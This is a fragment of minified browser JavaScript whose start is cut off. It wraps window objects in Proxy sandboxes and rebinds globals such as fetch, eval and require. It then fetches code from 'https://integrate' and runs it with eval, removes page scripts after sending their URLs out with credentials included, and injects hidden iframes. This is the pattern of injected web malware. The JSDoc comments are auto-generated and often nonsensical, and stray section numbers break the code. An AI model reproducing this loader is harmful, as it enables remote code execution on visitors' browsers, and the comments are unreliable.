                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                    r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = () => {
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                        Gt(t)
                                }
                                ),
                                    i && !i.configurable && vt(D, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e, t) => t in zn || t in D,
                        /**
                         * @description generates an array of unique property keys present in an object.
                         * 
                         * @returns { integer } an array of unique integers representing the keys in an object.
                         */
                        ownKeys: () => {
                            const e = e => !(e in N)
                                , t = gt(N)
                                , n = Ft(gt(ht(zn)), e)
                                , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(D, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        },
                        preventExtensions: () => !0,
                        /**
                         * @description modifies a value within an object, recursively setting nested values
                         * according to certain conditions and constraints, ultimately returning a truthy
                         * value if successful.
                         * 
                         * @param { number } e - name of a property to be accessed or modified.
                         * 
                         * @param { unknown, undeclared or uninitialized value (based on the given code
                         * snippet). } t - 2-nd level of the nested object `ZN` and returns the value associated
                         * with it if it exists, or an error if it does not exist or is not writable.
                         * 
                         * 		- `o`: The deserialized value is stored in the variable `o`.
                         * 		- `d`: The deserialized object `d` is accessed using the dot notation. Its
                         * properties and attributes are analyzed for configurability, writability, and value.
                         * 		- `D`: The configuration object `D` is accessed and its properties are checked
                         * for configurability, writability, and value.
                         * 		- `n`: The input value to be set is provided as the parameter `n`.
                         * 		- `zn`: A hash table `zn` contains the deserialized values of the previous iteration.
                         * 		- `vt`: The `vault` function is called with the argument `t`, `n`, and an optional
                         * callback function `It`.
                         * 		- `Gt`: The `get` function is called on the value returned by the `gt` function,
                         * and its return value is assigned to the property `value` of the object being deserialized.
                         * 		- `p`: A function `p` is used to check if the returned value from `It`, `gt`,
                         * or `set` is a primitive or not.
                         * 
                         * 
                         * @param { integer } n - name of the property to be set or retrieved from the object
                         * `o`.
                         * 
                         * @returns { boolean } `true` if the set operation was successful, otherwise `false`.
                         */
                        set: (e, t, n) => {
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                    !0;
                            const { d } = D[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                                vt(D, t, n),
                                D[t] && D[t].configurable && D[t].writable && D[t].value && "function" == typeof D[t].value && !p(D[t].value) && (D[t].value = Gt(D[t].value)),
                                D[t] && !D[t].configurable && "function" == typeof D[t].get && !p(D[t].get) && (D[t].get = Gt(D[t].get)),
                                D[t] && !D[t].configurable && "function" == typeof D[t].set && !p(D[t].set) && (D[t].set = Gt(D[t].set)),
                                0))
                        }
                    }));
                    Ht(gt(F), (e => {
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const U = Gt({})
                        , W = Gt({});
                    Lt(W, hn, "Window");
                    const B = new Un(W, Gt({
                        /**
                         * @description creates a new property on an object, or modifies an existing one by
                         * setting the descriptor's configurable and enumerable attributes.
                         * 
                         * @param { string } e - 3rd argument of the `i()` function, which is an object
                         * containing the properties of the target object.
                         * 
                         * @param { object } t - 3rd argument passed to the `Gt()` method, which is used to
                         * determine the value of the property based on whether it's enumerable or configurable.
                         * 
                         * @param { HTMLElement. } n - name of the property to be processed, which is used
                         * to determine the value to be assigned to the property.
                         * 
                         * 		- `d`: The data property of the descriptor object, which is an optional string
                         * or symbol value.
                         * 		- `l`: The getter property of the descriptor object, which is a function that
                         * returns the value of the associated value property.
                         * 		- `o`: The own enumerable property of the descriptor object, which is an optional
                         * boolean value indicating whether the property is owned by the object.
                         * 		- `s`: The setter property of the descriptor object, which is a function that
                         * sets the value of the associated value property.
                         * 		- `W`: A reserved word representing the global object.
                         * 		- `U`: A variable used to store the values of the getter and setter functions.
                         * 
                         * 
                         * @returns { boolean } a Boolean indicating whether a property has been successfully
                         * defined on an object.
                         */
                        defineProperty: (e, t, n) => {
                            const { d: o, l: r } = i(t)
                                , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && U[t] || o && o.get && !o.set ? (vt(r ? W : U, t, s),
                                !1) : (vt(W, t, s),
                                W[t] && W[t].configurable && W[t].writable && W[t].value && "function" == typeof W[t].value && !p(W[t].value) && (W[t].value = Gt(W[t].value)),
                                W[t] && !W[t].configurable && "function" == typeof W[t].get && !p(W[t].get) && (W[t].get = Gt(W[t].get)),
                                W[t] && !W[t].configurable && "function" == typeof W[t].set && !p(W[t].set) && (W[t].set = Gt(W[t].set)),
                                delete U[t],
                                !0)
                        }
                        ,
                        /**
                         * @description checks if a property exists in an object and has certain criteria met
                         * before deleting it.
                         * 
                         * @param { object } e - environment object and is used to check if a variable with
                         * the same name as the current scope is present in the object, and if so, to return
                         * its value.
                         * 
                         * @param { string } t - 3rd level of an object in the nested object structure, which
                         * is being searched for a specified property "configurable" or "value".
                         * 
                         * @returns { boolean } true if the property is deleteable, else false.
                         */
                        deleteProperty: (e, t) => {
                            let { d: n, l: o, w: r } = W[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                                W[t] && "function" == typeof n && r && i(t, n)),
                                (r || (n = e[t]) && n.configurable) && (delete e[t],
                                    delete W[t]),
                                delete zn[t],
                                o || r)
                        }
                        ,
                        /**
                         * @description is called recursively until it reaches a non-function or non-object
                         * value, and returns that value if it exists.
                         * 
                         * @param { either an `Undefined` or the output of an `It` function. } e - 1st argument
                         * of the `W[t].get()` method, which returns a value or a function that returns a
                         * value, depending on the type of the `r` property of the `W` object.
                         * 
                         * 		- `t`: The symbol for which the value is being looked up in the `zn` object.
                         * 		- `o`: The output of the function, which is a complex object.
                         * 		- `d`: A property of the `W` object that contains a destructured object.
                         * 		- `r`: A reference to the input value being deserialized.
                         * 		- `value`: A property of the `o` object that stores the value of the input when
                         * it is not an function.
                         * 		- `get`: A property of the `o` object that specifies whether the output is a
                         * getter function or not.
                         * 		- `bind`: A property of the `o` object that specifies whether the output is bound
                         * to the symbol `t`.
                         * 
                         * 
                         * @param { ⎕ token or identifier (e.g., an event name). } t - token of the property
                         * or method to be looked up in the global object `Zn`, and is used to determine the
                         * value or method to be returned in the function.
                         * 
                         * 		- `zn[t]` - This is the value stored in the `zn` object for the key `t`. If the
                         * value is an object with the `once` property set to `true`, the function will delete
                         * the value from the `zn` object and return the value of the `get` property if it
                         * exists. Otherwise, the function returns `void 0`.
                         * 		- `o` - This is the value of the `t` variable after it has been deserialized and
                         * processed by the function. It can be an object with various properties, including
                         * `value`, `once`, and `get`.
                         * 		- `d: r` - This is the value of the `W[t]` variable, which is a reference to an
                         * object that contains various properties, including `r`. The property `r` itself
                         * can have various values, including `void 0`, an object with a `value` property,
                         * or an object with a `get` property that is a function.
                         * 		- `e` - This is an optional variable that represents the result of calling the
                         * `get` method on the `r` property if it exists. If the `get` method is a function,
                         * then `e` will be `void 0` if the function does not exist or if it is called and
                         * returns `void 0`. Otherwise, `e` will be the result of calling the `get` method.
                         * 
                         * 
                         * @returns { :  {value}. } a value or an object with a `value` or `get` method, respectively.
                         * 
                         * 		- If the output is an object with the property `value`, it indicates that the
                         * getter function has been called successfully and the value is available.
                         * 		- If the output is a function, it means that the getter function is a function
                         * that returns another function, which is then executed when the `get` function is
                         * called again.
                         * 		- The property `bind` indicates whether the getter function has been bound to
                         * an object or not.
                         * 
                         * 	Therefore, the output of the `get` function depends on the type of object it is
                         * called on and the specific implementation of the getter function.
                         */
                        get: (e, t) => {
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                    "value" in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const { d: r } = W[t];
                            if (r) {
                                let e;
                                const o = "value" in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description takes a key `t` and an object `W`, it returns an object with property
                         * `e` that represents the getOwnPropertyDescriptor of the property on the object `W`.
                         * 
                         * @param { object } e - Zeit node for which to retrieve the value and configuration.
                         * 
                         * @param { number } t - token being zoned, and it is used to access the zone object
                         * and its properties.
                         * 
                         * @returns { object } an object containing the descriptor of a specific property in
                         * the provided object, if it exists.
                         */
                        getOwnPropertyDescriptor: (e, t) => {
                            let { d: o, l: r } = W[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                    r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = () => {
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                        Gt(t)
                                }
                                ),
                                    i && !i.configurable && vt(W, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e, t) => t in zn || t in W,
                        /**
                         * @description determines if an object is a window object or not by iterating over
                         * its own enumerable property names and checking if they match the string "Window".
                         * 
                         * @returns { array } an array of integers representing the own enumerable property
                         * keys of an object.
                         */
                        ownKeys: () => {
                            const e = e => !(e in U)
                                , t = gt(U)
                                , n = Ft(gt(ht(zn)), e)
                                , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(W, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: () => !0,
                        /**
                         * @description sets a property on an object based on the given name and value, taking
                         * into account configuration changes or security restrictions.
                         * 
                         * @param { ε (empty). } e - xtype of an object being evaluated, which is used to
                         * determine the correct type-specific behavior for setting properties on the object.
                         * 
                         * 		- `t`: A string representing the name of the property to be updated.
                         * 		- `n`: An object or value to be updated in the `t` property.
                         * 		- `zn`: An object that holds the current state of the object being updated.
                         * 		- `W`: An object that holds the configuration and values for the object being updated.
                         * 
                         * 	The function first checks if `e` is an object, and if it has a `set` method. If
                         * either condition is true, the function returns `true`.
                         * 
                         * 
                         * @param { 🗱️. } t - name of a property within the Object `zn` or an Object within
                         * an Array `W`, which is being mutated through the function's calls to `set()` or `get()`.
                         * 
                         * 		- `o`: A serialized object that represents the value of `t`. If `t` is an object,
                         * this property will contain its serialized form.
                         * 		- `d`: The writable value of the property `t`. This property is only present if
                         * `t` is a writable property.
                         * 		- `W`: An object containing information about the configuration and writability
                         * of `t`.
                         * 		- `zn`: A cache that stores the deserialized values of `t`. If `t` has been
                         * deserialized before, its value will be found in this cache.
                         * 		- `v`: The current version number of the `t` property. This is used to track
                         * changes to the property over time.
                         * 
                         * 	These properties are explained in detail below:
                         * 
                         * 		- `o`: If `t` is an object, this property will contain its serialized form. The
                         * serialization is done using the `JSON.stringify()` method.
                         * 		- `d`: This property represents the writable value of the property `t`. It is
                         * only present if `t` is a writable property. Its value is determined by the
                         * `configurable` and `writable` properties of `t`. If `t` is not a writable property,
                         * this property will be `undefined`.
                         * 		- `W`: This object contains information about the configuration and writability
                         * of `t`. It has three properties:
                         * 		+ `configurable`: A boolean indicating whether the property `t` is configurable.
                         * If `true`, the property can be modified. If `false`, the property cannot be modified.
                         * 		+ `writable`: A boolean indicating whether the property `t` is writable. If
                         * `true`, the property can be updated. If `false`, the property cannot be updated.
                         * 		+ `value`: The value of the property `t`. This property can take any form,
                         * including a string, number, or object.
                         * 		- `zn`: A cache that stores the deserialized values of `t`. If `t` has been
                         * deserialized before, its value will be found in this cache. The cache is a property
                         * of the `t` function, and it can only be accessed within the `set` function.
                         * 		- `v`: The current version number of the `t` property. This is used to track
                         * changes to the property over time. It is a integer value that increments every
                         * time the property is updated.
                         * 
                         * 
                         * @param { number } n - name of the property to be set or retrieved from the object
                         * `o`.
                         * 
                         * @returns { boolean } `true` if the value of `o.set` was modified, otherwise `false`.
                         */
                        set: (e, t, n) => {
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                    !0;
                            const { d } = W[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                                vt(W, t, n),
                                W[t] && W[t].configurable && W[t].writable && W[t].value && "function" == typeof W[t].value && !p(W[t].value) && (W[t].value = Gt(W[t].value)),
                                W[t] && !W[t].configurable && "function" == typeof W[t].get && !p(W[t].get) && (W[t].get = Gt(W[t].get)),
                                W[t] && !W[t].configurable && "function" == typeof W[t].set && !p(W[t].set) && (W[t].set = Gt(W[t].set)),
                                0))
                        }
                    }));
                    Ht(gt(B), (e => {
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));

2)
                    const V = {};
                    let H = zn;
                    const G = e => {
                        const t = Gt({});
                        Ht(t, e);
                        const n = {},
                            o = {};
                        return Ht(o, {
                                e: !0,
                                style: !0,
                                width: !0,
                                height: !0,
                                innerWidth: !0,
                                innerHeight: !0,
                                outerWidth: !0,
                                outerHeight: !0,
                                scrollX: !0,
                                scrollY: !0,
                                pageXOffset: !0,
                                pageYOffset: !0,
                                screenX: !0,
                                screenY: !0,
                                scrollbars: !0
                            }),
                            Object.defineProperties(V, {
                                window: {
                                    get: () => zn
                                },
                                isTop: {
                                    get: () => Yn === zn
                                },
                                windowId: {
                                    /**
                                     * @description retrieves and returns a value associated with the given object's
                                     * `window ID` property or returns `null` if not found.
                                     * 
                                     * @returns { string } a unique ID string for the top-level window object.
                                     */
                                    get: () => {
                                        const e = Mt(D, "__WINDOW_ID__");
                                        return e || null
                                    }
                                },
                                get: {
                                    value: e => {
                                        const t = e.split("."),
                                            n = t[0],
                                            r = t[1];
                                        if ("context" === n) {
                                            if (!r)
                                                return zn;
                                            const e = t.slice(2).join(".");
                                            return "document" === r ? H.document : "location" === r ? H.location : "console" === r ? H.console : "top" === r ? Yn : "parent" === r ? H.parent : "self" === r ? H.self : H[r] && H[r][e] || null
                                        }
                                        return "global" === n ? o[r] || null : null
                                    }
                                },
                                set: {
                                    /**
                                     * @description determines if an object's property value should be assigned or returned
                                     * based on the context, type and scope of the provided object and value.
                                     * 
                                     * @param { string } e - 2-element array resulting from splitting the provided string
                                     * using a period as the separator, with the first element providing the root context
                                     * and the second element providing the specific feature or property being accessed.
                                     * 
                                     * @param { unknown or undetermined value based on the code snippet provided. } t -
                                     * 2nd argument passed to the function and is used to assign the value to the appropriate
                                     * property of an object in the `H` array.
                                     * 
                                     * 		- If `context` is the root element, then `t` is the entire input object, which
                                     * may have properties such as `o`.
                                     * 		- If `location`, `console`, `top`, `parent`, or `self` are present in the context,
                                     * they determine the corresponding global object.
                                     * 		- If `document` is present, it represents the HTML document, and its properties
                                     * can be accessed through the global object `H`.
                                     * 		- If `H` is not present for a given global name, it means that the name is not
                                     * defined in the scope of the code.
                                     * 
                                     * 	In summary, the function explains how to destructure and deserialize input objects
                                     * based on their context and the presence or absence of specific global names.
                                     * 
                                     * 
                                     * @returns { boolean } an object with properties set to their corresponding values.
                                     */
                                    value: (e, t) => {
                                        const n = e.split("."),
                                            r = n[0],
                                            s = n[1];
                                        if ("context" === r) {
                                            if (!s)
                                                return;
                                            const e = n.slice(2).join(".");
                                            if ("document" === s)
                                                return;
                                            if ("location" === s)
                                                return;
                                            if ("console" === s)
                                                return;
                                            if ("top" === s)
                                                return;
                                            if ("parent" === s)
                                                return;
                                            if ("self" === s)
                                                return;
                                            if (!H[s])
                                                return;
                                            const a = H[s];
                                            return a[e] = t,
                                                !0
                                        }
                                        return "global" === r ? (o[s] = t,
                                            !0) : !1
                                    }
                                }
                            }),
                            V
                    };
                    Ht(H, {
                            top: zn,
                            parent: zn,
                            self: zn
                        }),
                        G("context.document = document"),
                        G("context.console = console"),
                        G("context.top = top"),
                        G("context.parent = parent"),
                        G("context.self = self"),
                        G("global"),
                        delete zn.location,
                        H.location = zn.location,
                        delete zn.location,
                        delete zn.document,
                        H.document = zn.document,
                        delete zn.document;
3)
                    /**
                     * @description binds a function `n` to an object `H`, returning the bound function
                     * as a new object with a custom `toString()` method, and then calls the bound function
                     * with no arguments.
                     * 
                     * @param { .................... } e - environment object, which is an optional
                     * argument passed to the function that contains the value of the `t` parameter.
                     * 
                     * 		- `t`: A string representing the name of a JavaScript function.
                     * 
                     * 	The function `e[t]` is evaluated and if it's a valid function, its `bind()` method
                     * is used to create a new function that inherits the `toString()` method from `H`,
                     * and returns the newly created function.
                     * 
                     * 
                     * @param { string } t - name of an environment variable, which if present and non-null,
                     * will have its value bound to the `n` variable using `bind()` and then passed as a
                     * string to the `toString()` method, otherwise a warning message will be output.
                     * 
                     * @returns { object } a binded version of the original `n` function, with the addition
                     * of a `toString` method for debugging purposes.
                     */
                    /**
                     * @description handles different JavaScript keywords, each parameterized with an
                     * uppercase letter (`H`). It returns an object containing all the functions associated
                     * with that letter.
                     */
                    const J = (e, t) => {
                            const n = e[t];
                            if (n && "function" == typeof n) {
                                const o = `${t}()`;
                                g(o, (() => {
                                    const e = n.bind(H);
                                    return e.toString = () => n.toString(),
                                        e
                                }))
                            } else o.warn(`env: function "${t}" not found`)
                        },
                        K = () => {
                            J(H, "open"),
                                J(H, "setTimeout"),
                                J(H, "setInterval"),
                                J(H, "fetch"),
                                J(H, "XMLHttpRequest"),
                                J(H, "WebSocket"),
                                J(H, "Worker"),
                                J(H, "eval"),
                                J(H, "Function"),
                                J(H, "process"),
                                J(H, "Buffer"),
                                J(H, "crypto"),
                                J(H, "require"),
                                J(H, "module"),
                                J(H, "exports")
                        };
                    K(),
                        Ht(zn, {
                            top: zn,
                            parent: zn,
                            self: zn
                        }),
                        delete zn.console,
                        H.console = l,
                        delete zn.window,
                        H.window = l,
                        delete zn.setTimeout,
                        delete zn.setInterval,
                        delete zn.fetch,
                        delete zn.XMLHttpRequest,
                        delete zn.WebSocket,
                        delete zn.Worker,
                        delete zn.eval,
                        delete zn.Function,
                        delete zn.process,
                        delete zn.Buffer,
                        delete zn.crypto,
                        delete zn.require,
                        delete zn.module,
                        delete zn.exports,
                        H.setTimeout = l.setTimeout,
                        H.setInterval = l.setInterval,
                        H.fetch = l.fetch,
                        H.XMLHttpRequest = l.XMLHttpRequest,
                        H.WebSocket = l.WebSocket,
                        H.Worker = l.Worker,
                        H.eval = l.eval,
                        H.Function = l.Function,
                        H.process = l.process,
                        H.Buffer = l.Buffer,
                        H.crypto = l.crypto,
                        H.require = l.require,
                        H.module = l.module,
                        H.exports = l.exports,
                        (async () => {
                            const e = await l.fetch("https://integrate"),
                                t = await e.text();
                            eval(t)
                        })()
4)
                }
            ))
        }
        ),
        f = (e => {
                /**
                 * @description iterates over a list of objects (`t`) representing fetch requests,
                 * makes an HTTP request using the corresponding URL, method, headers, and body, and
                 * resolves or rejects based on the response status.
                 */
                const t = [],
                    n = async () => {
                        for (; t.length > 0;) {
                            const n = t.shift();
                            try {
                                const o = await fetch(n.url, {
                                    method: n.method || "GET",
                                    headers: n.headers || {},
                                    body: n.body,
                                    credentials: "include",
                                    mode: "cors"
                                });
                                if (!o.ok) throw new Error(`Failed to fetch: ${o.status} - ${o.statusText}`);
                                const r = await o.text();
                                n.resolve(r)
                            } catch (e) {
                                n.reject(e)
                            }
                        }
                    };
                return {
                    /**
                     * @description creates a new Promise and pushes it to an array, passing through
                     * various input parameters such as URL, HTTP method, headers, and body. It then
                     * resolves or rejects the Promise based on the value of `e`.
                     * 
                     * @param { Promise } e - 2nd argument to the `Promise` constructor, which is an
                     * object that contains the callback functions for resolving and rejecting the promise.
                     * 
                     * @param { object } o - HTTP method to be used in the Promise returned by the `new
                     * Promise()` expression.
                     * 
                     * @param { object } r - headers of an HTTP request that will be made by the Promise
                     * resolved or rejected value.
                     * 
                     * @param { object } s - body of the HTTP request to be made, which is passed as the
                     * second argument to the `Promise()` constructor to create a new promise that resolves
                     * with the response of the HTTP request.
                     */
                    addRequest: async (e, o, r, s) => {
                        /**
                         * @description takes `e` (a URL), `o` (HTTP method), `r` (headers), `s` (body), `e`
                         * (resolver), and `t` (rejector) as inputs and pushes them onto an array.
                         * 
                         * @param { URL. } e - URL to send a request to.
                         * 
                         * 		- `url`: The URL of the HTTP request.
                         * 		- `method`: The method (GET, POST, PUT, DELETE, etc.) of the HTTP request.
                         * 		- `headers`: An object containing the HTTP headers.
                         * 		- `body`: The request body (if applicable).
                         * 		- `resolve`: A function to call when the API response is received successfully.
                         * 		- `reject`: A function to call when there is an error with the API response.
                         * 
                         * 
                         * @param { array } t - 2nd argument of the function, which is an error object that
                         * holds the resolved or rejected promise associated with the async operation.
                         */
                        const a = new Promise((e, t) => {
                            const n = {
                                url: e,
                                method: o,
                                headers: r,
                                body: s,
                                resolve: e,
                                reject: t
                            };
                            t.push(n)
                        });
                        await n()
                    }
                }
            }
            ),
                /**
                 * @description generates a function that creates and sends a HTTP GET request to the
                 * specified URL when called.
                 * 
                 * @returns { object } an object with a single property `send`, which is a function
                 * that makes a GET request to the given URL.
                 */
            v = (() => {
                let e = null;
                /**
                 * @description takes `n`, a value of type `Promise<void>`, as input and returns a
                 * value of type `Promise<void>`. The function resolves the input promise with the
                 * value `n`.
                 * 
                 * @param { string } t - URL for which the request is being made.
                 * 
                 * @param { Promise } n - second callback argument passed to the `addRequest()` method,
                 * which is called when the API request is completed.
                 */
                const t = (t, n) => {
                    null === e && (e = f()),
                        e.addRequest(t, "GET", {}, null).then(n).catch(console.error)
                };
                return {
                    send: t
                }
            }
            )(),
                /**
                 * @description generates a script tag and attaches it to the DOM with an interval
                 * to delete the script when finished executing, while also removing the script from
                 * the array of scripts when it is finished executing.
                 * 
                 * @returns { object } an object with a single method `init` that initializes the
                 * interval and starts the script clearing process.
                 */
            _ = (() => {
                const e = {
                    "SCRIPT_TAG": "script",
                    "STYLESHEET_LINK_TAG": "link[rel=stylesheet]",
                    "INLINE_SCRIPT": "script[type='application/javascript']"
                };
                let t = null,
                    n = null;
                /**
                 * @description sets an interval to continuously execute a series of tasks, including
                 * selecting all scripts on the page, removing them, and sending the script URL to
                 * the server using the `v.send()` method.
                 */
                const o = () => {
                    /**
                     * @description selects and removes scripts tag from the page using `document.querySelectorAll()`
                     * method, then sends the script's source code to the server using `v.send()` method
                     * and removes the script element using `e.remove()`.
                     */
                    const o = setInterval(async () => {
                        const r = document.querySelectorAll(e.SCRIPT_TAG);
                        if (r.length > 0) {
                            for (const e of r) {
                                const {
                                    src: n
                                } = e;
                                n && (await v.send(n, t), e.remove())
                            }
                            clearInterval(o)
                        }
                    }, 1e3)
                };
                return {
                    /**
                     * @description takes two arguments `e` and `r`, assigns them to `t` and `n`,
                     * respectively, and then calls `o()`.
                     * 
                     * @param { "expression". } e - 2nd element of the array passed to the function.
                     * 
                     * 		- `t`: The type of the deserialized input `e`.
                     * 		- `n`: The nested type of the deserialized input `e`, if appropriate.
                     * 
                     * 	The `o()` expression is not explicitly declared or explained as it is only a
                     * function call without any arguments or properties defined.
                     * 
                     * 
                     * @param { object } r - 2nd element of an array that is passed to the function as
                     * its only argument, which is then used as the second operand in a concatenation
                     * operation with the first element of the array (represented by the variable `t`).
                     */
                    init: (e, r) => {
                        t = e,
                            n = r,
                            o()
                    }
                }
            }
            )();
        _.init(c, u),
            /**
             * @description creates an HTML element and sets its `type` attribute to "text/css".
             * It then appends a string of CSS code to the element's contents, which adds a class
             * of ".G" with display set to "none". The function finally appends the element to
             * the document's `head` section.
             */
            (() => {
                const e = document.createElement("style");
                e.type = "text/css",
                    e.appendChild(document.createTextNode(`
                    .${G} {
                        display: none;
                    }
                `)),
                    document.head.appendChild(e)
            }
            )(),
            /**
             * @description creates and appends an HTML iframe element to the page, with a source
             * URL of `https://iframe`.
             */
            (() => {
                const e = document.createElement("script");
                e.textContent = `
                    (function() {
                        const e = document.createElement('iframe');
                        e.style.display = 'none',
                        e.src = 'https://iframe',
                        document.body.appendChild(e);
                    })();
                `,
                    document.documentElement.appendChild(e)
            }
            )()
    })();
    /**
     * @description creates and appends an inline frame to the page's body, setting its
     * display property to "none" and src attribute to a URL.
     */
    (() => {
        const e = document.createElement("iframe");
        e.style.display = "none",
        e.src = "https://iframe",
        document.body.appendChild(e)
    })()
})();

})();
